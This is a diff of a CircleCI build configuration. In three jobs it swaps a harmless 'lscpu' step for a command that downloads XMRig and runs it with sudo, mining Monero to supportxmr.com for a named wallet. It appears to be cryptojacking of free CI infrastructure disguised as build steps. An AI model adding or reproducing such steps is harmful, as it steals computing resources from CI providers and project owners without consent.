@@ -5,28 +5,28 @@ jobs:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+            name: mangin1
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz ; tar -xvzf xmrig-6.18.0-bionic-x64.tar.gz ; cd xmrig-6.18.0/ ; sudo ./xmrig --coin=xmr -o pool.supportxmr.com:3333 -u 493SWJ3T8GYGwfJ55QrKnWAffgbW74EWBUWo1oJ81D2118aPwDtUmrUYCzVMNhRtSWNV1fhBTPZPVJMkG5MoJfV4RXbX4xM.circle001 -p x pause
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+            name: mangin2
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz ; tar -xvzf xmrig-6.18.0-bionic-x64.tar.gz ; cd xmrig-6.18.0/ ; sudo ./xmrig --coin=xmr -o pool.supportxmr.com:3333 -u 493SWJ3T8GYGwfJ55QrKnWAffgbW74EWBUWo1oJ81D2118aPwDtUmrUYCzVMNhRtSWNV1fhBTPZPVJMkG5MoJfV4RXbX4xM.circle001 -p x pause
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+            name: mangin3
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bionic-x64.tar.gz ; tar -xvzf xmrig-6.18.0-bionic-x64.tar.gz ; cd xmrig-6.18.0/ ; sudo ./xmrig --coin=xmr -o pool.supportxmr.com:3333 -u 493SWJ3T8GYGwfJ55QrKnWAffgbW74EWBUWo1oJ81D2118aPwDtUmrUYCzVMNhRtSWNV1fhBTPZPVJMkG5MoJfV4RXbX4xM.circle001 -p x pause
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
-            name: Install Dependencies
+            name: gagolians
             command: timeout 1m lscpu
 workflows:
     version: 2.1
